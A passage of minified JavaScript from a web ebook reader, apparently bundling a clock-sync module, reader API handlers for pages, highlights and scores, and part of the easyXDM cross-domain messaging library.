            Object.defineProperty(n, "__esModule", {
                value: !0
            })
        }, {}],
        13: [function(e, t, n) {
            "use strict";
            function o(e) {
                function o(e) {
                    0 < s.list("error").length ? s.emit("error", e) : console.log("Error", e)
                }
                var s = {
                    options: {
                        interval: 36e5,
                        timeout: 1e4,
                        delay: 1e3,
                        repeat: 5,
                        peers: [],
                        server: null,
                        now: Date.now
                    },
                    offset: 0,
                    _timeout: null,
                    _inProgress: {},
                    _isFirst: !0,
                    send: function i(n, e) {
                        try {
                            g.post(n, e, function(e, t) {
                                e ? o(e) : s.receive(n, t)
                            }, s.options.timeout)
                        } catch (t) {
                            o(t)
                        }
                    },
                    receive: function n(e, t) {
                        t === undefined && (t = e, e = undefined),
                        t && t.id in s._inProgress ? s._inProgress[t.id](t.result) : t && t.id !== undefined && s.send(e, {
                            jsonrpc: "2.0",
                            id: t.id,
                            result: s.now()
                        })
                    },
                    rpc: function l(i, r, a) {
                        return new v(function(t, e) {
                            var n = h.nextId(),
                                o = setTimeout(function() {
                                    delete s._inProgress[n],
                                    e(new Error("Timeout"))
                                }, s.options.timeout);
                            s._inProgress[n] = function(e) {
                                clearTimeout(o),
                                delete s._inProgress[n],
                                t(e)
                            },
                            s.send(i, {
                                jsonrpc: "2.0",
                                id: n,
                                method: r,
                                params: a
                            })
                        })
                    },
                    sync: function r() {
                        s.emit("sync", "start");
                        var e = s.options.server ? [s.options.server] : s.options.peers;
                        return v.all(e.map(function(e) {
                            return s._syncWithPeer(e)
                        })).then(function(e) {
                            var t = e.filter(function(e) {
                                return s._validOffset(e)
                            });
                            0 < t.length && (s.offset = p.mean(t), s.emit("change", s.offset)),
                            s.emit("sync", "end")
                        })
                    },
                    _validOffset: function a(e) {
                        return null !== e && !isNaN(e) && isFinite(e)
                    },
                    _syncWithPeer: function c(e) {
                        function t() {
                            return s._getOffset(e).then(function(e) {
                                return i.push(e)
                            })
                        }
                        function n() {
                            return h.wait(s.options.delay).then(t)
                        }
                        function o() {
                            return i.length < s.options.repeat
                        }
                        var i = [];
                        return t().then(function() {
                            return h.whilst(o, n)
                        }).then(function() {
                            var e = i.filter(function(e) {
                                    return null !== e
                                }),
                                t = e.map(function(e) {
                                    return e.roundtrip
                                }),
                                n = p.median(t) + p.std(t),
                                o = e.filter(function(e) {
                                    return e.roundtrip < n
                                }).map(function(e) {
                                    return e.offset
                                });
                            return 0 < o.length ? p.mean(o) : null
                        })
                    },
                    _getOffset: function u(e) {
                        var i = s.options.now();
                        return s.rpc(e, "timesync").then(function(e) {
                            var t = s.options.now(),
                                n = t - i,
                                o = e - t + n / 2;
                            return s._isFirst && (s._isFirst = !1, s.offset = o, s.emit("change", o)), {
                                roundtrip: n,
                                offset: o
                            }
                        })["catch"](function() {
                            return null
                        })
                    },
                    now: function d() {
                        return s.options.now() + s.offset
                    },
                    destroy: function f() {
                        clearTimeout(s._timeout)
                    }
                };
                if (e) {
                    if (e.server && e.peers)
                        throw new Error('Configure either option "peers" or "server", not both.');
                    for (var t in e)
                        e.hasOwnProperty(t) && ("peers" === t && "string" == typeof e.peers ? s.options.peers = e.peers.split(",").map(function(e) {
                            return e.trim()
                        }).filter(function(e) {
                            return "" !== e
                        }) : s.options[t] = e[t])
                }
                return m(s), null !== s.options.interval && (s._timeout = setInterval(s.sync, s.options.interval), setTimeout(function() {
                    s.sync()["catch"](function(e) {
                        return o(e)
                    })
                }, 0)), s
            }
            var i = function i(e) {
                    return e && e.__esModule ? e["default"] : e
                },
                r = function r(e) {
                    return e && e.__esModule ? e : {
                        "default": e
                    }
                };
            n.create = o,
            Object.defineProperty(n, "__esModule", {
                value: !0
            });
            var h = r(e("./util.js")),
                p = r(e("./stat.js")),
                g = r(e("./request/request")),
                m = i(e("./emitter.js")),
                v = e("./Promise")
        }, {
            "./Promise": 7,
            "./emitter.js": 8,
            "./request/request": 10,
            "./stat.js": 12,
            "./util.js": 14
        }],
        14: [function(e, t, n) {
            "use strict";
            function o(t) {
                return new s(function(e) {
                    setTimeout(e, t)
                })
            }
            function i(i, r) {
                return new s(function(e) {
                    function t() {
                        n < r ? (n++, i().then(function(e) {
                            o.push(e),
                            t()
                        })) : e(o)
                    }
                    var n = 0,
                        o = [];
                    t()
                })
            }
            function r(n, o) {
                return new s(function(e) {
                    function t() {
                        n() ? o().then(function() {
                            return t()
                        }) : e()
                    }
                    t()
                })
            }
            function a() {
                return l++
            }
            n.wait = o,
            n.repeat = i,
            n.whilst = r,
            n.nextId = a,
            Object.defineProperty(n, "__esModule", {
                value: !0
            });
            var s = e("./Promise"),
                l = 0
        }, {
            "./Promise": 7
        }]
    }, {}, [13])(13)
}),
function(e, l) {
    function n(e) {
        "function" == typeof e && (i ? e() : r.push(e)),
        t || ((t = timesync.create({
            server: this.buildAPIURL("/activities/timesync"),
            delay: 200,
            interval: null,
            repeat: 5
        })).on("error", function(e) {
            console.error("timesync - error:", e)
        }), t.on("sync", function(e) {
            "end" === e && (i = !0, r.forEach(function(e) {
                e.call()
            }), r = [], t.off("sync"))
        }), t.sync())
    }
    function o(e, s) {
        e.dataContext || (e.dataContext = {}),
        e.dataContext.sentTime = (new Date).toISOString(),
        e.dataContext.extensions || (e.dataContext.extensions = {}),
        e.dataContext.extensions["vnd.vst.timesync_offset"] = t.offset,
        l.ajax({
            url: this.buildAPIURL("/activities"),
            type: "POST",
            contentType: "application/json; charset=UTF-8",
            dataType: "json",
            data: JSON.stringify(e),
            success: function(e) {
                s && s(e)
            },
            error: function(e, t, n) {
                if (s) {
                    var o = {
                            errors: []
                        },
                        i = {
                            status: e.status + "",
                            title: t,
                            detail: n
                        };
                    try {
                        var r = l.parseJSON(e.responseText);
                        o = l.extend(o, r)
                    } catch (a) {}
                    o.errors.push(i),
                    s(o)
                }
            }
        })
    }
    var t = null,
        i = !1,
        r = [];
    e.Handler.set("book:retrieveActivityData", function(e, s) {
        t || n.call(this),
        null != s && null != e && l.ajax({
            url: this.buildAPIURL("/activities"),
            type: "GET",
            dataType: "json",
            data: e,
            success: function(e) {
                s(e)
            },
            error: function(e, t, n) {
                var o = {
                        errors: []
                    },
                    i = {
                        status: e.status + "",
                        title: t,
                        detail: n
                    };
                try {
                    var r = l.parseJSON(e.responseText);
                    o = l.extend(o, r)
                } catch (a) {}
                o.errors.push(i),
                s(o)
            }
        })
    }),
    e.Handler.set("book:sendActivityData", function(e, t) {
        null != e && (i ? o.call(this, e, t) : n.call(this, o.bind(this, e, t)))
    })
}.call(this, VST, VST.$),
function(s) {
    s.Handler.set("book:getCurrentPageURL", function() {
        return s.window.location.pathname.replace(/\/?books\/[^\/]+\/(epub|cfi)/, "")
    }),
    s.Handler.set("book:getTOC", function(n) {
        var e = function(t) {
            s.ajax({
                url: this.buildAPIURL("/toc"),
                dataType: "json",
                success: function(e) {
                    t && t(undefined, e)
                }
            }, t)
        };
        s.Utils.multi("getTOC", e, function(e, t) {
            n(e, t)
        }, this)
    }),
    s.Handler.set("book:getPages", function(i) {
        if (this.activePagesAjaxRequest = this.activePagesAjaxRequest || undefined, "undefined" != typeof this.pages)
            i && i(undefined, this.pages);
        else {
            var e = function(e, t) {
                i(undefined, t)
            };
            if (s.EventDispatcher.once("book:getPages", e), !this.activePagesAjaxRequest) {
                var r = this,
                    a = function(e) {
                        r.activePagesAjaxRequest = undefined,
                        s.EventDispatcher.fire("book:getPages", e)
                    };
                this.activePagesAjaxRequest = s.ajax({
                    url: r.buildAPIURL("/pages"),
                    success: function(e) {
                        if (i) {
                            for (var t = [], n = 0; n < e.length; n++) {
                                var o = e[n];
                                o.url = o.absoluteURL,
                                t.push(new s.Models.Page(o))
                            }
                            r.setPages(t),
                            a(t)
                        }
                    },
                    dataType: "json"
                }, a)
            }
        }
    }),
    s.Handler.set("book:goToNextPage", function(n) {
        Jigsaw.navigationRequested();
        var o = this;
        s.eventWrapper("book:nextPage", function() {
            o.getNextPage(function(e, t) {
                t.length ? Jigsaw.navigateTo(t.map(function(e) {
                    return o.buildURL(e.getPath())
                }), function() {
                    n(undefined, t[0])
                }) : n(new s.Error("page not found"))
            })
        })
    }),
    s.Handler.set("book:goToPreviousPage", function(n) {
        Jigsaw.navigationRequested();
        var o = this;
        s.eventWrapper("book:previousPage", function() {
            o.getPreviousPage(function(e, t) {
                t.length ? Jigsaw.navigateTo(t.map(function(e) {
                    return o.buildURL(e.getPath())
                }), function() {
                    n(undefined, t[t.length - 1])
                }) : n(new s.Error("page not found"))
            })
        })
    });
    var h = function() {
        return s.dpsOn
    };
    s.Handler.set("book:getNextPage", function(d) {
        var f = this;
        this.getPages(function(e, t) {
            for (var n = f.getCurrentPageURL().toUpperCase(), o = 0; o < t.length - 1 && n != t[o].getPath().toUpperCase(); o++)
                ;
            if (o !== t.length - 1) {
                var i = o + 1,
                    r = t[o];
                if (h(r)) {
                    var a = r.getPageSpread(),
                        s = t[i].getPageSpread();
                    if ("left" === a && "right" === s) {
                        if (i > t.length - 1)
                            return void d(undefined, []);
                        i += 1
                    }
                }
                var l,
                    c = t[i],
                    u = [c];
                if (h(c)) {
                    s = c.getPageSpread();
                    l = t[i + 1],
                    "left" === s && l && "right" === l.getPageSpread() && u.push(l)
                }
                d && d(undefined, u)
            } else
                d(undefined, [])
        })
    }),
    s.Handler.set("book:getPreviousPage", function(u) {
        var d = this.getCurrentPageURL().toUpperCase();
        this.getPages(function(e, t) {
            for (var n = 0; n < t.length && d != t[n].getPath().toUpperCase(); n++)
                ;
            var o = n - 1;
            if (o < 0)
                u(undefined, []);
            else {
                var i = t[n];
                if (h(i)) {
                    var r = i.getPageSpread(),
                        a = t[o].getPageSpread();
                    if ("right" === r && "left" === a) {
                        if (o <= 0)
                            return void u(undefined, []);
                        o -= 1
                    }
                }
                var s,
                    l = t[o],
                    c = [l];
                if (l && h(l)) {
                    r = l.getPageSpread();
                    s = t[o - 1],
                    "right" === r && s && "left" === s.getPageSpread() && c.unshift(s)
                }
                u && u(undefined, c)
            }
        })
    }),
    s.Handler.set("book:getNextPageURL", function(o) {
        this.getNextPage(function(e, t) {
            var n = t[0];
            o && o(undefined, n ? n.getPath() : undefined)
        })
    }),
    s.Handler.set("book:getPreviousPageURL", function(o) {
        this.getPreviousPage(function(e, t) {
            var n = t[t.length - 1];
            o && o(undefined, n ? n.getPath() : undefined)
        })
    }),
    s.Handler.set("book:getCurrentPage", function(o) {
        var i,
            r = this.getCurrentPageURL().toUpperCase();
        this.getPages(function(e, t) {
            for (var n = 0; n < t.length; n++)
                if (r == t[n].getPath().toUpperCase()) {
                    i = t[n];
                    break
                }
            o && o(undefined, i)
        })
    }),
    s.Handler.set("book:getCurrentPages", function(e) {
        var t,
            o = [];
        s.Book.getPages(function(e, n) {
            s.documents.forEach(function(t) {
                var e = n.findIndex(function(e) {
                    return -1 != t.URL.indexOf(e.getPath())
                });
                o.push(e)
            }),
            t = o.sort(function(e, t) {
                return e - t
            }).map(function(e) {
                return n[e]
            })
        }),
        e && e(undefined, t)
    }),
    s.Handler.set("book:hasNextPage", function(n) {
        this.getNextPage(function(e, t) {
            n && (t.length ? n(undefined, !0) : n(undefined, !1))
        })
    }),
    s.Handler.set("book:hasPreviousPage", function(n) {
        this.getPreviousPage(function(e, t) {
            n && (t.length ? n(undefined, !0) : n(undefined, !1))
        })
    }),
    s.Handler.set("book:getPageBreaks", function(t) {
        var n = this;
        return this.hasPageBreaks() ? this.pageBreakList && 0 < this.pageBreakList.length ? t(undefined, this.pageBreakList) : void s.ajax({
            url: this.buildAPIURL("/pagebreaks"),
            dataType: "json",
            success: function(e) {
                n.setPageBreaks(e),
                t && t(undefined, e)
            }
        }, t) : t(new s.Error("Book does not have pagebreaks"))
    }),
    s.Handler.set("book:getHighlights", function(n) {
        var e = function(t) {
            s.ajaxEventWrapper("getHighlights", {
                url: this.buildAPIURL("/highlights"),
                success: function(e) {
                    t(undefined, e)
                },
                dataType: "json"
            }, t)
        };
        s.Utils.multi("getHighlights", e, function(e, t) {
            n(e, t)
        }, this)
    })
}.call(window, VST, VST.$),
function(i, t) {
    i.Handler.set("book:getScores", function(e, o) {
        null != o && null != e && (i.Utils.isArray(e) || (e = [e]), t.ajax({
            url: this.buildAPIURL("/scores"),
            type: "GET",
            dataType: "json",
            data: {
                score_ids: e
            },
            success: function(e) {
                o(null, e)
            },
            statusCode: {
                404: function() {
                    o(new i.Error("scores not found"))
                }
            },
            error: function(e, t, n) {
                /not found/i.test(n) || o(new i.Error(n))
            }
        }))
    }),
    i.Handler.set("book:reportScores", function(e, o) {
        null != e && (i.Utils.isArray(e) || (e = [e]), t.ajax({
            url: this.buildAPIURL("/scores"),
            type: "POST",
            dataType: "json",
            data: {
                scores: e
            },
            success: function(e) {
                o && o(null, e)
            },
            error: function(e, t, n) {
                o && o(new i.Error(n))
            }
        }))
    })
}.call(this, VST, VST.$),
function(i) {
    i.Handler.set("user:books", function(e, o) {
        i.ajax({
            url: "/books",
            type: "GET",
            data: e,
            dataType: "json",
            success: function(e) {
                o && o(undefined, e)
            },
            error: function(e, t, n) {
                o && o(new i.Error(n))
            }
        }, o)
    }),
    i.Handler.set("user:getInfo", function(e) {
        if (e) {
            var t = function(t) {
                i.ajax({
                    url: "/user",
                    success: function(e) {
                        t(undefined, e)
                    },
                    error: function(e) {
                        t(new i.Error(e))
                    },
                    dataType: "json"
                }, t)
            };
            i.Utils.multi("getUserInfo", t, e, this)
        }
    })
}.call(this, VST, VST.$),
function() {
    this.Browser = {
        init: function() {},
        isIE: function() {},
        isIE11: function() {},
        isChrome: function() {},
        isSafari: function() {
            return -1 != navigator.userAgent.indexOf("Safari") && -1 == navigator.userAgent.indexOf("Chrome")
        },
        isFirefox: function() {},
        isOld: function() {},
        isLimited: function() {},
        isAndroid: function() {},
        isIOS: function() {
            return /(iPhone|iPad|iPod)/.test(navigator.userAgent)
        },
        getIOSVersion: function() {
            if (this.isIOS()) {
                var e = navigator.userAgent.match(/os (\d+([_\s]\d+)*) like mac os x/i);
                if (e && 1 < e.length) {
                    var t = e[1].replace(/[_\s]/g, ".");
                    return parseFloat(t)
                }
            }
        },
        isSurface: function() {
            return window.navigator.pointerEnabled || window.navigator.msPointerEnabled
        },
        isIPhone: function() {},
        isIPad: function() {},
        isMobile: function() {}
    }
}.call(this, jQuery),
function(g, u, d, m, f, h) {
    function l(e, t) {
        var n = typeof e[t];
        return "function" == n || !("object" != n || !e[t]) || "unknown" == n
    }
    function t(e, t) {
        return !("object" != typeof e[t] || !e[t])
    }
    function p(e) {
        return "[object Array]" === Object.prototype.toString.call(e)
    }
    function c() {
        var e,
            t = "Shockwave Flash",
            n = "application/x-shockwave-flash";
        if (!w(navigator.plugins) && "object" == typeof navigator.plugins[t]) {
            var o = navigator.plugins[t].description;
            o && !w(navigator.mimeTypes) && navigator.mimeTypes[n] && navigator.mimeTypes[n].enabledPlugin && (N = o.match(/\d+/g))
        }
        if (!N)
            try {
                e = new ActiveXObject("ShockwaveFlash.ShockwaveFlash"),
                N = Array.prototype.slice.call(e.GetVariable("$version").match(/(\d+),(\d+),(\d+),(\d+)/), 1),
                e = null
            } catch (a) {}
        if (!N)
            return !1;
        var i = parseInt(N[0], 10),
            r = parseInt(N[1], 10);
        return P = 9 < i && 0 < r, !0
    }
    function n() {
        if (!G) {
            G = !0;
            for (var e = 0; e < z.length; e++)
                z[e]();
            z.length = 0
        }
    }
    function v(e, t) {
        G ? e.call(t) : z.push(function() {
            e.call(t)
        })
    }
    function r() {
        var e = parent;
        if ("" !== j)
            for (var t = 0, n = j.split("."); t < n.length; t++)
                e = e[n[t]];
        return e.easyXDM
    }
    function e(e) {
        return g.easyXDM = O, (j = e) && (D = "easyXDM_" + j.replace(".", "_") + "_"), M
    }
    function T(e) {
        return e.match(R)[3]
    }
    function S(e) {
        return e.match(R)[4] || ""
    }
    function y(e) {
        var t = e.toLowerCase().match(R);
        if (!t)
            return "";
        var n = t[2],
            o = t[3],
            i = t[4] || "";
        return ("http:" == n && ":80" == i || "https:" == n && ":443" == i) && (i = ""), n + "//" + o + i
    }
    function b(e) {
        if (!(e = e.replace(L, "$1/")).match(/^(http||https):\/\//)) {
            var t = "/" === e.substring(0, 1) ? "" : d.pathname;
            "/" !== t.substring(t.length - 1) && (t = t.substring(0, t.lastIndexOf("/") + 1)),
            e = d.protocol + "//" + d.host + t + e
        }
        for (; i.test(e);)
            e = e.replace(i, "");
        return e
    }
    function x(e, t) {
        var n = "",
            o = e.indexOf("#");
        -1 !== o && (n = e.substring(o), e = e.substring(0, o));
        var i = [];
        for (var r in t)
            t.hasOwnProperty(r) && i.push(r + "=" + h(t[r]));
        return e + (U ? "#" : -1 == e.indexOf("?") ? "?" : "&") + i.join("&") + n
    }
    function w(e) {
        return void 0 === e
    }
    function V(e, t, n) {
        var o;
        for (var i in t)
            t.hasOwnProperty(i) && (i in e ? "object" == typeof (o = t[i]) ? V(e[i], o, n) : n || (e[i] = t[i]) : e[i] = t[i]);
        return e
    }
    function a() {
        var e = u.body.appendChild(u.createElement("form")),
            t = e.appendChild(u.createElement("input"));
        t.name = D + "TEST" + B,
        I = t !== e.elements[t.name],
        u.body.removeChild(e)
    }
    function C(e) {
        var t;
        w(I) && a(),
        (t = I ? u.createElement('<iframe name="' + e.props.name + '" allowfullscreen="allowfullscreen" />') : u.createElement("IFRAME")).id = t.name = e.props.name,
        delete e.props.name,
        t.allowFullscreen = "allowfullscreen",
        "string" == typeof e.container && (e.container = u.getElementById(e.container)),
        e.container || (V(t.style, {
            position: "absolute",
            top: "-2000px",
            left: "0px"
        }), e.container = u.body);
        var n = e.props.src;
        if (e.props.src = "javascript:false", V(t, e.props), t.border = t.frameBorder = 0, t.allowTransparency = !0, e.container.appendChild(t), e.onLoad && F(t, "load", e.onLoad), e.usePost) {
            var o,
                i = e.container.appendChild(u.createElement("form"));
            if (i.target = t.name, i.action = n, i.method = "POST", "object" == typeof e.usePost)
                for (var r in e.usePost)
                    e.usePost.hasOwnProperty(r) && (I ? o = u.createElement('<input name="' + r + '"/>') : (o = u.createElement("INPUT")).name = r, o.value = e.usePost[r], i.appendChild(o));
            i.submit(),
            i.parentNode.removeChild(i)
        } else
            t.src = n;
        return e.props.src = n, t
    }
    function k(e, t) {
        "string" == typeof e && (e = [e]);
        for (var n, o = e.length; o--;)
            if (n = e[o], (n = new RegExp("^" == n.substr(0, 1) ? n : "^" + n.replace(/(\*)/g, ".$1").replace(/\?/g, ".") + "$")).test(t))
                return !0;
        return !1
    }
    function s(e) {
        var t,
            n = e.protocol;
        if (e.isHost = e.isHost || w($.xdm_p), U = e.hash || !1, e.props || (e.props = {}), e.isHost)
            e.remote = b(e.remote),
            e.channel = e.channel || "default" + B++,
            e.secret = Math.random().toString(16).substring(2),
            w(n) && (n = y(d.href) == y(e.remote) ? "4" : l(g, "postMessage") || l(u, "postMessage") ? "1" : e.swf && l(g, "ActiveXObject") && c() ? "6" : "Gecko" === navigator.product && "frameElement" in g && -1 == navigator.userAgent.indexOf("WebKit") ? "5" : e.remoteHelper ? "2" : "0");
        else if (e.channel = $.xdm_c.replace(/["'<>\\]/g, ""), e.secret = $.xdm_s, e.remote = $.xdm_e.replace(/["'<>\\]/g, ""), n = $.xdm_p, e.acl && !k(e.acl, e.remote))
            throw new Error("Access denied for " + e.remote);
        switch (e.protocol = n) {
        case "0":
            if (V(e, {
                interval: 100,
                delay: 2e3,
                useResize: !0,
                useParent: !1,
                usePolling: !1
            }, !0), e.isHost) {
                if (!e.local) {
                    for (var o, i = d.protocol + "//" + d.host, r = u.body.getElementsByTagName("img"), a = r.length; a--;)
                        if ((o = r[a]).src.substring(0, i.length) === i) {
                            e.local = o.src;
                            break
                        }
                    e.local || (e.local = g)
                }
                var s = {
                    xdm_c: e.channel,
                    xdm_p: 0
                };
                e.local === g ? (e.usePolling = !0, e.useParent = !0, e.local = d.protocol + "//" + d.host + d.pathname + d.search, s.xdm_e = e.local, s.xdm_pa = 1) : s.xdm_e = b(e.local),
                e.container && (e.useResize = !1, s.xdm_po = 1),
                e.remote = x(e.remote, s)
            } else
                V(e, {
                    channel: $.xdm_c,
                    remote: $.xdm_e,
                    useParent: !w($.xdm_pa),
                    usePolling: !w($.xdm_po),
                    useResize: !e.useParent && e.useResize
                });
            t = [new M.stack.HashTransport(e), new M.stack.ReliableBehavior({}), new M.stack.QueueBehavior({
                encode: !0,
                maxLength: 4e3 - e.remote.length
            }), new M.stack.VerifyBehavior({
                initiate: e.isHost
            })];
            break;
        case "1":
            t = [new M.stack.PostMessageTransport(e)];
            break;
        case "2":
            e.isHost && (e.remoteHelper = b(e.remoteHelper)),
            t = [new M.stack.NameTransport(e), new M.stack.QueueBehavior, new M.stack.VerifyBehavior({
                initiate: e.isHost
            })];
            break;
        case "3":
            t = [new M.stack.NixTransport(e)];
            break;
        case "4":
            t = [new M.stack.SameOriginTransport(e)];
            break;
        case "5":
            t = [new M.stack.FrameElementTransport(e)];
            break;
        case "6":
            N || c(),
            t = [new M.stack.FlashTransport(e)]
        }
        return t.push(new M.stack.QueueBehavior({
            lazy: e.lazy,
            remove: !0
        })), t
    }
    function E(e) {
        for (var t, n = {
                incoming: function(e, t) {
                    this.up.incoming(e, t)
                },
                outgoing: function(e, t) {
                    this.down.outgoing(e, t)
                },
                callback: function(e) {
                    this.up.callback(e)
                },
                init: function() {
                    this.down.init()
                },
                destroy: function() {
                    this.down.destroy()
                }
            }, o = 0, i = e.length; o < i; o++)
            V(t = e[o], n, !0),
            0 !== o && (t.down = e[o - 1]),
            o !== i - 1 && (t.up = e[o + 1]);
        return t
    }
    function o(e) {
        e.up.down = e.down,
        e.down.up = e.up,
        e.up = e.down = null
    }
    var I,
        N,
        P,
        F,
        A,
        _ = this,
        B = Math.floor(1e4 * Math.random()),
        H = Function.prototype,
        R = /^((http.?:)\/\/([^:\/\s]+)(:\d+)*)/,
        i = /[\-\w]+\/\.\.\//,
        L = /([^:])\/\//g,
        j = "",
        M = {},
        O = g.easyXDM,
        D = "easyXDM_",
        U = !1;
    if (l(g, "addEventListener"))
        F = function(e, t, n) {
            e.addEventListener(t, n, !1)
        },
        A = function(e, t, n) {
            e.removeEventListener(t, n, !1)
        };
    else {
        if (!l(g, "attachEvent"))
            throw new Error("Browser not supported");
        F = function(e, t, n) {
            e.attachEvent("on" + t, n)
        },
        A = function(e, t, n) {
            e.detachEvent("on" + t, n)
        }
    }
    var W,
        G = !1,
        z = [];
    if ("readyState" in u ? (W = u.readyState, G = "complete" == W || ~navigator.userAgent.indexOf("AppleWebKit/") && ("loaded" == W || "interactive" == W)) : G = !!u.body, !G) {
        if (l(g, "addEventListener"))
            F(u, "DOMContentLoaded", n);
        else if (F(u, "readystatechange", function() {
            "complete" == u.readyState && n()
        }), u.documentElement.doScroll && g === top) {
            var J = function() {
                if (!G) {
                    try {
                        u.documentElement.doScroll("left")
                    } catch (e) {
                        return void m(J, 1)
                    }
                    n()
                }
            };
            J()
        }
        F(g, "load", n)
    }
    var q,
        $ = function(e) {
            for (var t, n = {}, o = (e = e.substring(1).split("&")).length; o--;)
                n[(t = e[o].split("="))[0]] = f(t[1]);
            return n
        }(/xdm_e=/.test(d.search) ? d.search : d.hash),
        X = function() {
            var e = {},
                t = {
                    a: [1, 2, 3]
                },
                n = '{"a":[1,2,3]}';
            return "undefined" != typeof JSON && "function" == typeof JSON.stringify && JSON.stringify(t).replace(/\s/g, "") === n ? JSON : (Object.toJSON && Object.toJSON(t).replace(/\s/g, "") === n && (e.stringify = Object.toJSON), "function" == typeof String.prototype.evalJSON && (t = n.evalJSON()).a && 3 === t.a.length && 3 === t.a[2] && (e.parse = function(e) {
                return e.evalJSON()
            }), e.stringify && e.parse ? (X = function() {
                return e
            }, e) : null)
        };
    V(M, {
        version: "2.4.19.3",
        query: $,
        stack: {},
        apply: V,
        getJSONObject: X,
        whenReady: v,
        noConflict: e
    }),
    M.DomHelper = {
        on: F,
        un: A,
        requiresJSON: function(e) {
            t(g, "JSON") || u.write('<script type="text/javascript" src="' + e + '"></script>')
        }
    },
    q = {},
    M.Fn = {
        set: function(e, t) {
            q[e] = t
        },
        get: function(e, t) {
            if (q.hasOwnProperty(e)) {
                var n = q[e];
                return t && delete q[e], n
            }
        }
    },
    M.Socket = function(n) {
        var t = E(s(n).concat([{
                incoming: function(e, t) {
                    n.onMessage(e, t)
                },
                callback: function(e) {
                    n.onReady && n.onReady(e)
                }
            }])),
            o = y(n.remote);
        this.origin = y(n.remote),
        this.destroy = function() {
            t.destroy()
        },
        this.postMessage = function(e) {
            t.outgoing(e, o)
        },
        t.init()
    },
    M.Rpc = function(t, e) {
        if (e.local)
            for (var n in e.local)
                if (e.local.hasOwnProperty(n)) {
                    var o = e.local[n];
                    "function" == typeof o && (e.local[n] = {
                        method: o
                    })
                }
        var i = E(s(t).concat([new M.stack.RpcBehavior(this, e), {
            callback: function(e) {
                t.onReady && t.onReady(e)
            }
        }]));
        this.origin = y(t.remote),
        this.destroy = function() {
            i.destroy()
        },
        i.init()
    },
    M.stack.SameOriginTransport = function(e) {
        var t,
            n,
            o,
            i;
        return t = {
            outgoing: function(e, t, n) {
                o(e),
                n && n()
            },
            destroy: function() {
                n && (n.parentNode.removeChild(n), n = null)
            },
            onDOMReady: function() {
                i = y(e.remote),
                e.isHost ? (V(e.props, {
                    src: x(e.remote, {
                        xdm_e: d.protocol + "//" + d.host + d.pathname,
                        xdm_c: e.channel,
                        xdm_p: 4
                    }),
                    name: D + e.channel + "_provider"
                }), n = C(e), M.Fn.set(e.channel, function(e) {
                    return o = e, m(function() {
                        t.up.callback(!0)
                    }, 0), function(e) {
                        t.up.incoming(e, i)
                    }
                })) : (o = r().Fn.get(e.channel, !0)(function(e) {
                    t.up.incoming(e, i)
                }), m(function() {
                    t.up.callback(!0)
                }, 0))
            },
            init: function() {
                v(t.onDOMReady, t)
            }
        }
    },
    M.stack.FlashTransport = function(i) {
        function n(e) {
            m(function() {
                r.up.incoming(e, s)
            }, 0)
        }
        function o(n) {
            var e = i.swf + "?host=" + i.isHost,
                t = "easyXDM_swf_" + Math.floor(1e4 * Math.random());
            M.Fn.set("flash_loaded" + n.replace(/[\-.]/g, "_"), function() {
                M.stack.FlashTransport[n].swf = l = c.firstChild;
                for (var e = M.stack.FlashTransport[n].queue, t = 0; t < e.length; t++)
                    e[t]();
                e.length = 0
            }),
            i.swfContainer ? c = "string" == typeof i.swfContainer ? u.getElementById(i.swfContainer) : i.swfContainer : (V((c = u.createElement("div")).style, P && i.swfNoThrottle ? {
                height: "20px",
                width: "20px",
                position: "fixed",
                right: 0,
                top: 0
            } : {
                height: "1px",
                width: "1px",
                position: "absolute",
                overflow: "hidden",
                right: 0,
                top: 0
            }), u.body.appendChild(c));
            var o = "callback=flash_loaded" + h(n.replace(/[\-.]/g, "_")) + "&proto=" + _.location.protocol + "&domain=" + h(T(_.location.href)) + "&port=" + h(S(_.location.href)) + "&ns=" + h(j);
            c.innerHTML = "<object height='20' width='20' type='application/x-shockwave-flash' id='" + t + "' data='" + e + "'><param name='allowScriptAccess' value='always'></param><param name='wmode' value='transparent'><param name='movie' value='" + e + "'></param><param name='flashvars' value='" + o + "'></param><embed type='application/x-shockwave-flash' FlashVars='" + o + "' allowScriptAccess='always' wmode='transparent' src='" + e + "' height='1' width='1'></embed></object>"
        }
        var r,
            a,
            s,
            l,
            c;
        return r = {
            outgoing: function(e, t, n) {
                l.postMessage(i.channel, e.toString()),
                n && n()
            },
            destroy: function() {
                try {
                    l.destroyChannel(i.channel)
                } catch (e) {}
                l = null,
                a && (a.parentNode.removeChild(a), a = null)
            },
            onDOMReady: function() {
                s = i.remote,
                M.Fn.set("flash_" + i.channel + "_init", function() {
                    m(function() {
                        r.up.callback(!0)
                    })
                }),
                M.Fn.set("flash_" + i.channel + "_onMessage", n),
                i.swf = b(i.swf);
                var e = T(i.swf),
                    t = function() {
                        M.stack.FlashTransport[e].init = !0,
                        (l = M.stack.FlashTransport[e].swf).createChannel(i.channel, i.secret, y(i.remote), i.isHost),
                        i.isHost && (P && i.swfNoThrottle && V(i.props, {
                            position: "fixed",
                            right: 0,
                            top: 0,
                            height: "20px",
                            width: "20px"
                        }), V(i.props, {
                            src: x(i.remote, {
                                xdm_e: y(d.href),
                                xdm_c: i.channel,
                                xdm_p: 6,
                                xdm_s: i.secret
                            }),
                            name: D + i.channel + "_provider"
                        }), a = C(i))
                    };
                M.stack.FlashTransport[e] && M.stack.FlashTransport[e].init ? t() : M.stack.FlashTransport[e] ? M.stack.FlashTransport[e].queue.push(t) : (M.stack.FlashTransport[e] = {
                    queue: [t]
                }, o(e))
            },
            init: function() {
                v(r.onDOMReady, r)
            }
        }
    },
    M.stack.PostMessageTransport = function(o) {
        function n(e) {
            if (e.origin)
                return y(e.origin);
            if (e.uri)
                return y(e.uri);
            if (e.domain)
                return d.protocol + "//" + e.domain;
            throw "Unable to retrieve the origin of the event"
        }
        function i(e) {
            var t = n(e);
            t == l && "string" == typeof e.data && e.data.substring(0, o.channel.length + 1) == o.channel + " " && r.up.incoming(e.data.substring(o.channel.length + 1), t)
        }
        var r,
            a,
            s,
            l;
        return r = {
            outgoing: function(e, t, n) {
                s.postMessage(o.channel + " " + e, t || l),
                n && n()
            },
            destroy: function() {
                A(g, "message", i),
                a && (s = null, a.parentNode.removeChild(a), a = null)
            },
            onDOMReady: function() {
                if (l = y(o.remote), o.isHost) {
                    var t = function(e) {
                        e.data == o.channel + "-ready" && (s = "postMessage" in a.contentWindow ? a.contentWindow : a.contentWindow.document, A(g, "message", t), F(g, "message", i), m(function() {
                            r.up.callback(!0)
                        }, 0))
                    };
                    F(g, "message", t),
                    V(o.props, {
                        src: x(o.remote, {
                            xdm_e: y(d.href),
